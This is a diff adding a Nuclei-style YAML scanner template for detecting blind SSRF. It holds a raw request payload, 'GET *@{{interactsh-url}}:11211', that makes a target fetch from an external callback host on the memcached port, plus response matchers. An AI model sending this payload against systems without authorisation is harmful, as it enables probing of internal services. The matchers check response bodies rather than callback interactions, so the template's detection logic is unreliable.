@@ -1,0 +1,38 @@
+id: 0x149
+
+info:
+  name: Blind SSRF
+  author: reewardius
+  severity: high
+  tags: ssrf
+
+http:
+  - raw:
+      - |
+        GET *@{{interactsh-url}}:11211 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Cache-Control: no-transform
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+
+    stop-at-first-match: true
+    unsafe: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "key"
+          - "data"
+          - "status"
+        condition: and
+      - type: word
+        part: header
+        words:
+          - application/openapi+json
+          - application/json
+        condition: or
+      - type: status
+        status:
+          - 200
